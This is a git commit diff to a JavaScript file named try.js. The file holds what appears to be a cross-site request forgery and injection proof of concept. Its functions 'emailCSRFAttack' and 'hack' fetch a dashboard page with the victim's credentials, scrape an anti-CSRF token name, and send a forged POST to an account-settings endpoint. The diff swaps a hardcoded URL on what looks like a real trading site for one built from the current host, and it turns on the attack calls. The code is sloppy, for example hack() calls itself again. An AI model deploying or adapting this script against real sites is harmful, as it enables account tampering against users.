9839cb45b2572180fb35905dbef0814393bc7d8b
bull <mangoiscat@gmail.com>
2018-03-17 16:53:18 +0530

    rgrg

--- 45/try.js
+++ 45/try.js
@@ -9,7 +9,7 @@ function plantCookie()
 	
 }
 
-
+plantCookie();
 
 emailCSRFAttack();
 
@@ -18,7 +18,7 @@ function emailCSRFAttack()
 	
 	var fetchHash = new XMLHttpRequest();
 
-	var url = "https://dapp.spectre.ai/dashboard";
+	var url = window.location.protocol+"//"+window.location.hostname+"/dashboard";
 	var datax;
 	var all_elements;
 	var vc_email_token='initial';
@@ -34,7 +34,7 @@ function emailCSRFAttack()
 					   all_elements = loot.getElementsByTagName( 'input' );
 					   vc_email_token = all_elements[49].name;
 					   alert('Your token name: '+vc_email_token);
-					   //hack(vc_email_token);
+					   hack(vc_email_token);
 
 
         }
@@ -44,6 +44,53 @@ function emailCSRFAttack()
 fetchHash.open("GET",url, true);
 fetchHash.withCredentials=true;
 fetchHash.send();
+	
+	
+	
+}
+
+
+
+function hack(csrfName)
+{
+	
+	
+	
+	var fetchHash = new XMLHttpRequest();
+
+	var url = window.location.protocol+"//"+window.location.hostname+"/components/account-settings/user-profile-photo-save";
+	var datax;
+	var all_elements;
+	var vc_email_token='initial';
+
+	fetchHash.onreadystatechange=function ()
+	{
+		if(fetchHash.readyState==4 && fetchHash.status==200)
+        {
+
+            datax = fetchHash.responseText;
+                       var loot = document.createElement('html');
+					   loot.innerHTML = datax;
+					   all_elements = loot.getElementsByTagName( 'input' );
+					   vc_email_token = all_elements[49].name;
+					   alert('Your token name: '+vc_email_token);
+					   hack(vc_email_token);
+
+
+        }
+
+	}
+
+fetchHash.open("POST",url, true);
+fetchHash.withCredentials=true;
+fetchHash.send();
+	
+	
+	
+	
+	
+	
+	
 	
 	
 	
